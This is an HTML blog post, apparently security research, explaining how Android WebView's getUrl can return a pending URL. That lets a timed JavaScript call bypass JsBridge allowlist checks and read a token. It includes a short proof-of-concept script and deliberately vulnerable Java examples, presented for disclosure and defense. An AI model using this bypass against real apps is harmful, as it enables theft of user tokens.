@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  
+  <title>JavaScriptInterface Once More | 么哈么哈</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言近两年端侧发现的漏洞很大一部分都出在WebView白名单上，经过多年的攻防对抗，大多数知名应用都已经总结出了一套比较稳定的安全的白名单校验方法。但是由于开发人员对 WebView 的本质理解不到位，即使是目前最为通用的安全校验方法也会存在问题，导致绕过。 笔者于 2020 年初的时候发现了这一问题，并在多个业界知名产品上复现成功。现已联合华为浏览器推出解决方案，可以从根本上解决此类问题。 笔者">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaScriptInterface Once More">
+<meta property="og:url" content="http://mohamoha.club/2021/05/30/JavascriptInterface_once_more/index.html">
+<meta property="og:site_name" content="么哈么哈">
+<meta property="og:description" content="前言近两年端侧发现的漏洞很大一部分都出在WebView白名单上，经过多年的攻防对抗，大多数知名应用都已经总结出了一套比较稳定的安全的白名单校验方法。但是由于开发人员对 WebView 的本质理解不到位，即使是目前最为通用的安全校验方法也会存在问题，导致绕过。 笔者于 2020 年初的时候发现了这一问题，并在多个业界知名产品上复现成功。现已联合华为浏览器推出解决方案，可以从根本上解决此类问题。 笔者">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://mohamoha.club/JavascriptInterface_once_more/verify.png">
+<meta property="og:image" content="http://mohamoha.club/JavascriptInterface_once_more/browser.png">
+<meta property="og:image" content="http://mohamoha.club/JavascriptInterface_once_more/render.png">
+<meta property="og:image" content="http://mohamoha.club/JavascriptInterface_once_more/setEntry.png">
+<meta property="og:updated_time" content="2021-07-11T07:42:33.890Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="JavaScriptInterface Once More">
+<meta name="twitter:description" content="前言近两年端侧发现的漏洞很大一部分都出在WebView白名单上，经过多年的攻防对抗，大多数知名应用都已经总结出了一套比较稳定的安全的白名单校验方法。但是由于开发人员对 WebView 的本质理解不到位，即使是目前最为通用的安全校验方法也会存在问题，导致绕过。 笔者于 2020 年初的时候发现了这一问题，并在多个业界知名产品上复现成功。现已联合华为浏览器推出解决方案，可以从根本上解决此类问题。 笔者">
+<meta name="twitter:image" content="http://mohamoha.club/JavascriptInterface_once_more/verify.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">么哈么哈</a>
+      </h1>
+      
+        <h2 id="subtitle-wrap">
+          <a href="/" id="subtitle">Too young, Too simple, Sometime naive</a>
+        </h2>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="https://github.com">github</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://mohamoha.club"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-JavascriptInterface_once_more" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/05/30/JavascriptInterface_once_more/" class="article-date">
+  <time datetime="2021-05-29T16:00:00.000Z" itemprop="datePublished">2021-05-30</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      JavaScriptInterface Once More
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>近两年端侧发现的漏洞很大一部分都出在WebView白名单上，经过多年的攻防对抗，大多数知名应用都已经总结出了一套比较稳定的安全的白名单校验方法。但是由于开发人员对 WebView 的本质理解不到位，即使是目前最为通用的安全校验方法也会存在问题，导致绕过。</p>
+<p>笔者于 2020 年初的时候发现了这一问题，并在多个业界知名产品上复现成功。现已联合华为浏览器推出解决方案，可以从根本上解决此类问题。</p>
+<p>笔者的研究也入选了 2021 年的 <a href="https://www.blackhat.com/asia-21/briefings/schedule/#the-tangled-webview-------javascriptinterface-once-more-21831" target="_blank" rel="noopener">BH ASIA</a> 和 <a href="https://conference.hitb.org/hitbsecconf2021ams/sessions/mind-the-bridge-a-new-attack-model-for-hybird-mobile-applications/" target="_blank" rel="noopener">HITB ASM</a></p>
+<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><p>关于白名单校验的问题，rebeyond 的文章《一文彻底搞懂安卓WebView白名单校验》已经做了全面的阐述，目前的检测方案也和文中推荐的类似，这里做简要说明。</p>
+<p>现在比较完善的一个 JsBridge 白名单校验方案是</p>
+<p><img src="/JavascriptInterface_once_more/verify.png" alt></p>
+<p>在 JsBridge 被调用时，通过 <code>WebView.getUrl</code> 实时的获取当前 WebView 的 URL，并以此做白名单校验。</p>
+<p>这套方案本身比较完善，可以防御很多此类的攻击。但是由于开发人员对 WebView 的本质理解不到位，即使是这套方案，在实际使用时也存在被绕过的风险</p>
+<a id="more"></a>
+<h1 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h1><p>根据上文的描述，我们可以知道目前的白名单校验机制<strong>完全依赖</strong>于 <code>WebView.getUrl</code>，开发者通常会完全信任这个函数返回的结果，而依据此做白名单判断。</p>
+<p>但是事实上 <strong><code>WebView.getUrl</code> 返回的值并不总是当前正在执行的 URL</strong> ！</p>
+<p>举例来说下面的 Java 代码实现</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JsObject</span> </span>&#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadUrl</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.webview.loadUrl(url)</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getToken</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(isPermission())  <span class="comment">// 使用实时 WebView.getUrl 做校验</span></span><br><span class="line">                <span class="keyword">return</span> token;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">webview.addJavascriptInterface(<span class="string">"myObj"</span>,  <span class="keyword">new</span> JsObject());</span><br><span class="line"></span><br><span class="line"><span class="function">bool <span class="title">isPermission</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Url url = webview.getUrl();</span><br><span class="line">    <span class="keyword">return</span> inWhiteList(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>WebView提供敏感函数 geToken，并使用实时 <code>WebView.getUrl</code> 的方式做白名单校验。但是同时它还提供一个函数 loadUrl 的 JsBridge 接口给页面调用。在这种情况下攻击者就可以欺骗应用让 getUrl 返回错误的地址，从而绕过白名单校验。</p>
+<p>poc<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">browser_navigation</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">    myObj.loadUrl(<span class="string">"https://www.huawei.com"</span>)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">getToken</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">    myObj.getToken();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="function"><span class="keyword">function</span> <span class="title">bypass</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line">    setTimeout(getToken,400);</span><br><span class="line">    browser_navigation();</span><br><span class="line">  &#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>查看 WebView 中 getUrl 的定义，注释中明确指出该函数获取的只是 <code>visible URL</code>。有可能不是当前正在运行的 url，有可能是一个正在加载的 url。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* Get the URL of the current page. This is the visible URL of the &#123;<span class="doctag">@link</span> WebContents&#125; which may</span></span><br><span class="line"><span class="comment">* be a pending navigation or the last committed URL. For the last committed URL use</span></span><br><span class="line"><span class="comment">* #getLastCommittedUrl().</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">* <span class="doctag">@return</span> The URL of the current page or null if it's empty.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> GURL <span class="title">getUrl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (isDestroyed(WARN))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    GURL url = mWebContents.getVisibleUrl();</span><br><span class="line">    <span class="keyword">if</span> (url == <span class="keyword">null</span> || url.getSpec().trim().isEmpty())</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> url;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>继续查看关键代码，逻辑走到 chromium 的关键函数中</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NavigationEntryImpl* <span class="title">NavigationControllerImpl::GetVisibleEntry</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// The pending entry is safe to return for new (non-history), browser-</span></span><br><span class="line">    <span class="comment">// initiated navigations. Most renderer-initiated navigations should not</span></span><br><span class="line">    <span class="comment">// show the pending entry, to prevent URL spoof attacks.</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// We make an exception for renderer-initiated navigations in new tabs, as</span></span><br><span class="line">    <span class="comment">// long as no other page has tried to access the initial empty document in</span></span><br><span class="line">    <span class="comment">// the new tab. If another page modifies this blank page, a URL spoof is</span></span><br><span class="line">    <span class="comment">// possible, so we must stop showing the pending entry.</span></span><br><span class="line">    <span class="keyword">bool</span> safe_to_show_pending = pending_entry_ &amp;&amp; <span class="comment">// Require a new navigation.</span></span><br><span class="line">                                pending_entry_index_ == <span class="number">-1</span> &amp;&amp; <span class="comment">// Require either browser-initiated or an unmodified new tab.</span></span><br><span class="line">                                (!pending_entry_-&gt;is_renderer_initiated() || IsUnmodifiedBlankTab());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Also allow showing the pending entry for history navigations in a new tab,</span></span><br><span class="line">    <span class="comment">// such as Ctrl+Back. In this case, no existing page is visible and no one</span></span><br><span class="line">    <span class="comment">// can script the new tab before it commits.</span></span><br><span class="line">    <span class="keyword">if</span> (!safe_to_show_pending &amp;&amp; pending_entry_ &amp;&amp; pending_entry_index_ != <span class="number">-1</span> &amp;&amp; IsInitialNavigation() &amp;&amp; !pending_entry_-&gt;is_renderer_initiated())</span><br><span class="line">        safe_to_show_pending = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (safe_to_show_pending)</span><br><span class="line">        <span class="keyword">return</span> pending_entry_;</span><br><span class="line">    <span class="keyword">return</span> GetLastCommittedEntry();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>函数判断，如果经过判断当前的执行上下文可信，就返回 pending_entry_ 这个字段 ，否则就返回 GetLastCommittedEntry 字段。chromium 认为对于 browser-initiated-navigation 来说执行上下文是可信的，可以直接返回 pending_entry_，而对大部分的 render-initiated-navigation  来说执行上下文是不可信的，pending_entry_ 有可能是错误的。在这种不安全的情况下，应该返回 LastCommittedEntry。</p>
+<p>对于桌面浏览器而言，这个判断大体是成立的。<em>但是对于 Webview 来说，这种判断条件却常常可以被打破，从而会在并不安全的情况下返回 pending_entry</em>。</p>
+<p>这里的几个概念，笔者先做一下简要说明。</p>
+<h2 id="browser-initiated-navigation-和-render-initiated-navigation"><a href="#browser-initiated-navigation-和-render-initiated-navigation" class="headerlink" title="browser-initiated-navigation 和 render-initiated-navigation"></a>browser-initiated-navigation 和 render-initiated-navigation</h2><p>浏览器中存在两种 navigation 的方式，browser-initiated 和 render-initiated，Chrome 根据触发 navigation 的进程类型为他们命名。通俗来说 browser-initiated 就是 UI 触发的跳转，而 render-initiated 就是页面触发的跳转。从设计上来说 browser-navigation 更可信一些，通常是来自用户交互行为，而 render-initiated 则有可能来自攻击者。</p>
+<ul>
+<li>Browser-initiate-navigation   有可能的触发方式有 Omnibox,  bookmarks, context menus</li>
+<li>Render-initiate-navigation    有可能的触发方式有 Links,forms, scripts.</li>
+</ul>
+<p>browser-initiated-navigation 的流程大体为</p>
+<p><img src="/JavascriptInterface_once_more/browser.png" alt></p>
+<ol>
+<li>browser 向当前 render 发送 RequestNavigation，转交 render 模块处理(Browser -&gt; render)</li>
+<li>render 检查是否是向自己的跳转，如果是则转为走 refresh 流程</li>
+<li>render 处理 beforeunload 事件</li>
+<li>render 发送 BeginNavigation 消息给 RenderFrameHost（render -&gt; browser）</li>
+<li>Browser 创建 pending_navigation</li>
+<li>beginNavigation 创建 ResourceLoader 请求网络（ browser -&gt; network）</li>
+<li>检查 CSP</li>
+<li>RenderFrameHost 检查 pending_navigation 是否和网络请求匹配</li>
+<li>RFHM 选择一个合适的 RFH 来渲染内容</li>
+<li>RFH 发送 CommitNavigation 给 RenderFrame （Browser -&gt; render）</li>
+<li>Blink 发送 requst 并渲染之</li>
+</ol>
+<p>render-initiated-navigation 的流程稍稍简单一些可以省略 1-4 步。</p>
+<p><img src="/JavascriptInterface_once_more/render.png" alt></p>
+<p>可以看到二者在执行流程上大体相同，唯一的区别在于 navitgation request 是从 render 而不是 browser 发出的。</p>
+<h2 id="last-commited-entry，pending-entry，visible-URL"><a href="#last-commited-entry，pending-entry，visible-URL" class="headerlink" title="last_commited_entry，pending_entry，visible_URL"></a>last_commited_entry，pending_entry，visible_URL</h2><p>navigation 过程中中有几个重要的概念： <code>last_commited_entry</code>，<code>pending_entry</code>，<code>visible_URL</code>。</p>
+<ul>
+<li>last_commited_entry 用来表示当前 frame 的 URL。这个值在 Commit 之后设置</li>
+</ul>
+<ul>
+<li><p>pending_entry 用来表示一个 navigation 已经开始，但是还没有 commit。这个值通常在 navigation 一开始就设置。browser-initiated-navigation 流程会在 NavigateWithoutEntry 函数中创建并设置；render-initiated-navigation 流程会在 GetNavigationEntryForRendererInitiatedNavigation 函数中设置（但是通常不会）。</p>
+</li>
+<li><p>visible_URL 是地址栏展示的 URL。</p>
+</li>
+</ul>
+<p>这几个值的设置时机如图所示</p>
+<p><img src="/JavascriptInterface_once_more/setEntry.png" alt></p>
+<p>pending_entry 的设置时机非常早，甚至要早于 WebView 的回调函数 <code>ShouldOverrideUrlLoading</code> 和 <code>OnPageStarted</code>。 而 last_commited_entry 的设置时机就非常晚，发生在 Render 模块渲染页面时。而延时攻击发生的时间窗就在 Old Render 模块调用 Unload 之前。从图中我们可以看出来，如果 <code>getUrl</code> 返回的是 pending_entry ，那么我们将会有充分的时间窗来进行延时攻击。</p>
+<p>所以我们来分别看一下 Browser-initiated 和 Render-initiated 两种方案在设置 pending_entry 时的判断。</p>
+<p>browser-initiated 流程中，只要 navigation 的目的 scheme 不是 javascript， 就会创建一个对应的 entry ，并且设置为 pending_entry</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">void NavigationControllerImpl::NavigateWithoutEntry(</span><br><span class="line">    const LoadURLParams&amp; params) &#123;</span><br><span class="line"></span><br><span class="line">  // ...</span><br><span class="line">  std::unique_ptr&lt;NavigationEntryImpl&gt; entry;</span><br><span class="line">  if (!params.url.SchemeIs(url::kJavaScriptScheme)) &#123;</span><br><span class="line">    entry = CreateNavigationEntryFromLoadParams(</span><br><span class="line">        node, params, override_user_agent, should_replace_current_entry,</span><br><span class="line">        has_user_gesture);</span><br><span class="line">    DiscardPendingEntry(false);</span><br><span class="line">    SetPendingEntry(std::move(entry));</span><br><span class="line">  &#125;</span><br><span class="line">  // ...</span><br></pre></td></tr></table></figure>
+<p>render-initiated 流程中，只有当前的 pending_entry 为空，或者当前的 pending_entry 不是通过 browser-initiated 流程创建时才会继续。简而言之就是只有空页面，或者通过 windows.open 打开的新页面才会继续后面的流程，设置 pending_entry。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">NavigationEntryImpl*</span><br><span class="line">Navigator::GetNavigationEntryForRendererInitiatedNavigation(</span><br><span class="line">    const mojom::CommonNavigationParams&amp; common_params,</span><br><span class="line">    FrameTreeNode* frame_tree_node) &#123;</span><br><span class="line"></span><br><span class="line">  // ...</span><br><span class="line"></span><br><span class="line">  NavigationEntryImpl* pending_entry = controller_-&gt;GetPendingEntry();</span><br><span class="line">  bool has_browser_initiated_pending_entry =</span><br><span class="line">      pending_entry &amp;&amp; !pending_entry-&gt;is_renderer_initiated();</span><br><span class="line">  if (has_browser_initiated_pending_entry)</span><br><span class="line">    return nullptr;</span><br><span class="line"></span><br><span class="line">   // ...</span><br><span class="line"></span><br><span class="line">  std::unique_ptr&lt;NavigationEntryImpl&gt; entry =</span><br><span class="line">      NavigationEntryImpl::FromNavigationEntry();</span><br><span class="line"></span><br><span class="line">  controller_-&gt;SetPendingEntry(std::move(entry));</span><br><span class="line">  if (delegate_)</span><br><span class="line">    delegate_-&gt;NotifyChangedNavigationState(content::INVALIDATE_TYPE_URL);</span><br><span class="line"></span><br><span class="line">  return controller_-&gt;GetPendingEntry();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看出，Chromium 对于 render-initiated 还是做了很多的限制，但是对于 browser-initiated 就宽松许多。</p>
+<p>“从设计上来说 browser-navigation 更可信一些，通常是来自用户交互行为，而 render-initiated 则有可能来自攻击者。” —— 这句话在 PC 端浏览器是没有太多问题的，但是在移动端的情况则会有些不同。</p>
+<p>对于 WebView 来说，<code>WebView.loadUrl</code> 是一个 browser-initiated 行为。<strong>开发者不应该将这个行为暴露给 js，使得 js 触发的 navigation 变成 browser-initiated。</strong></p>
+<p>而大量移动端应用的开发者并不了解浏览器内部的各种机制，再加上编码过程中大量的 copy，导致这种问题频繁出现，在 StackOverflow 等网站上我们经常可以看到一些典型的错误<a href="https://stackoverflow.com/questions/8578332/webview-webchromeclient-method-oncreatewindow-not-called-for-target-blank" target="_blank" rel="noopener">代码示例</a>被作为解决方案提供给开发者。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view, String urls)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (urls.startsWith(<span class="string">"newtab:"</span>)) &#123;</span><br><span class="line">        addTab(); <span class="comment">//add a new tab or window</span></span><br><span class="line">        loadNewURL(urls.substring(<span class="number">7</span>)); <span class="comment">//strip "newtab:" and load url in the webview of the newly created tab or window</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        view.loadUrl(urls); <span class="comment">//load url in current WebView</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>此外 android 应用还可以通过 scheme 拉起或者干脆将 loadUrl 接口暴露给 js 等方式，触发 <code>WebView.loadUrl</code>。而这些行为均是可以从 js 也即 render 端发起的。<strong>这些不合理的代码逻辑直接打破了 <code>WebView.getUrl</code> 的信任边界，使得原本可信的 browser-initiated navigation 也不再可信 ！</strong></p>
+<h1 id="漏洞模式"><a href="#漏洞模式" class="headerlink" title="漏洞模式"></a>漏洞模式</h1><p>由于该漏洞本质上是由于两种 navigation 混淆导致的，笔者给这种漏洞命名为 navigation confused vulnerability。<br>经过简单分析和实际的攻击笔者发现了三种可能触发这个漏洞的模式</p>
+<h2 id="Direct-navigation-confused-vulnerability"><a href="#Direct-navigation-confused-vulnerability" class="headerlink" title="Direct navigation confused vulnerability"></a>Direct navigation confused vulnerability</h2><p>第一种情况如之前的例子所写，应用的开发者直接将 <code>WebWiew.loadUrl</code> 暴露给不可信的 js 代码，攻击者就可以通过 js 直接触发 browser-initiate-navigation，修改 WebView 中的 <code>pending_entry_</code> ，使 <code>WebWiew.getUrl</code> 返回错误的值，绕过白名单校验</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">JsObject</span> </span>&#123;</span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">loadUrl</span><span class="params">(String url)</span></span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">this</span>.webview.loadUrl(url)  <span class="comment">// js 可以触发的 browser-initiate-navigation</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@JavascriptInterface</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">getToken</span><span class="params">()</span></span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(isPermission())  <span class="comment">// 使用实时 WebView.getUrl 做校验</span></span><br><span class="line">                <span class="keyword">return</span> token;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">webview.addJavascriptInterface(<span class="string">"myObj"</span>,  <span class="keyword">new</span> JsObject());</span><br><span class="line"></span><br><span class="line"><span class="function">bool <span class="title">isPermission</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Url url = webview.getUrl();</span><br><span class="line">    <span class="keyword">return</span> inWhiteList(url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这种情况出现的较少，只在极个别的应用内发现，但是却非常典型。</p>
+<h2 id="ReDirect-navigation-confused-vulnerability"><a href="#ReDirect-navigation-confused-vulnerability" class="headerlink" title="ReDirect navigation confused vulnerability"></a>ReDirect navigation confused vulnerability</h2><p>第二种情况，在 WebView 的 shouldOverrideUrlLoading、 onJsPrmote 等生命周期回调函数中，以直接或者间接的形式提供 <code>WebWiew.loadUrl</code> 的调用路径。 攻击者就可以通过 js 触发生命周期回调的方式触发 browser-initiate-navigation，修改 WebView 中的 <code>pending_entry_</code> ，使 <code>WebWiew.getUrl</code> 返回错误的值，绕过白名单校验。</p>
+<p>比较典型的问题有两种，一种是把 url 作为某种协议来传输复杂数据，当 url 符合某个逻辑规范时就会从 url 中获取数据作为新的跳转地址</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view, WebResourceRequest request)</span> </span>&#123;</span><br><span class="line">    Uri uri = request.getUrl();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">"protocol"</span>.equal(url.getScheme()))&#123;  <span class="comment">// url matchs a specific pattern</span></span><br><span class="line">        String fallback = url.getParam(<span class="string">"fallback_url"</span>);  <span class="comment">// extract another url</span></span><br><span class="line">        <span class="keyword">if</span> (isInWhiteList(fallback))&#123;</span><br><span class="line">            view.loadUrl(fallback);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>另一种是当 url 不符合要求时会强制跳转到一个固定地址，而这个固定地址通常会是一个白名单内地址</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">String pattern = <span class="string">"https://recharge.com/"</span>;</span><br><span class="line">String mainland = <span class="string">"https://google.com"</span>;   <span class="comment">// it usually a url in white list</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!Pattern.matches(pattern,url))&#123;   <span class="comment">// url do not match pattern</span></span><br><span class="line">        view.loadUrl(mainland);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>两种漏洞的 poc 比较类似，都是通过一个 render-inititiated-navigation 结合延时攻击</p>
